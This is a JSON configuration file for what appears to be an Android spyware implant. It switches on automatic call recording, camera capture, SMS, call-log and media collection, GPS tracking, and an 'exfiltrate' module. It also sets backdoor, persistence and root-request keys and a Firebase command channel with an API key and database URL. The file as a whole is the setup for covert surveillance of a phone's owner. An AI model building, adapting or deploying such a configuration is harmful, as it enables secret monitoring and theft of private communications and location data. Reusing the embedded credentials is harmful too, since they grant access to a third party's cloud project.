{
  "core": {
  },

  "plugins": {
    "modgsmcall": {
      "quality": 0,
      "incoming_on_ringing": true
    },
    "modcamera": {
      "allow_auto": true,
      "use_autofocus": true,
      "quality": 0,
      "mode": 0
    },
    "modgps": {
      "allow_auto": false,
      "interval": 600,
      "force_passive_provider": false
    },
    "modsms": {
      "allow_auto": true
    },
    "modcalllog": {
      "allow_auto": true,
      "incoming_on_ringing": true
    },
    "modmedia": {
      "allow_auto": true,
      "make_thumbnails": true,
      "onthefly_include_image": true,
      "onthefly_include_video": true,
      "onthefly_include_audio": false,
      "onthefly_include_file": true
    },
    "modevidence": {
      "max_agent_cache_percent_freespace": 20,
      "usynch": {
        "backdoor_id": "00112233445566778899aabbccdd",
        "aes_key": "00112233445566778899aabbccddeeff",
        "conf_key": "00112233445566778899aabbccddeeff",
        "challenge_key": "00112233445566778899aabbccddeeff",
        "demo_mode": "00112233445566778899aabbccddeeff0011223344556677",
        "root_request": "00112233445566778899aabbccddeeff",
        "random_seed": "00112233445566778899aabbccddeeff",
        "persistence": "00112233445566778899aabbccddeeff",
        "host": "00112233445566778899aabbccddeeff"
      }
    },
    "modcmdfirebase": {
      "api_key": "AIzaSyAXvvIff0RQ679UiqY4CJZm3zoTCm2aGHU",
      "database_url": "https://testme-c6588.firebaseio.com",
      "application_id": "1:911991300449:android:2402743fb16a63c8",
      "project_id": "testme-c6588",
      "pkg": "com.great.firebase",
      "storage_bucket": "testagt-9cee3.appspot.com",
      "usynch": {
        "backdoor_id": "00112233445566778899aabbccdd",
        "aes_key": "00112233445566778899aabbccddeeff",
        "conf_key": "00112233445566778899aabbccddeeff",
        "challenge_key": "00112233445566778899aabbccddeeff",
        "demo_mode": "00112233445566778899aabbccddeeff0011223344556677",
        "root_request": "00112233445566778899aabbccddeeff",
        "random_seed": "00112233445566778899aabbccddeeff",
        "persistence": "00112233445566778899aabbccddeeff",
        "host": "00112233445566778899aabbccddeeff"
      }
    },
    "modexfiltrate": {
      "usynch": {
        "backdoor_id": "00112233445566778899aabbccdd",
        "aes_key": "00112233445566778899aabbccddeeff",
        "conf_key": "00112233445566778899aabbccddeeff",
        "challenge_key": "00112233445566778899aabbccddeeff",
        "demo_mode": "00112233445566778899aabbccddeeff0011223344556677",
        "root_request": "00112233445566778899aabbccddeeff",
        "random_seed": "00112233445566778899aabbccddeeff",
        "persistence": "00112233445566778899aabbccddeeff",
        "host": "00112233445566778899aabbccddeeff"
      }
    }
  }
}
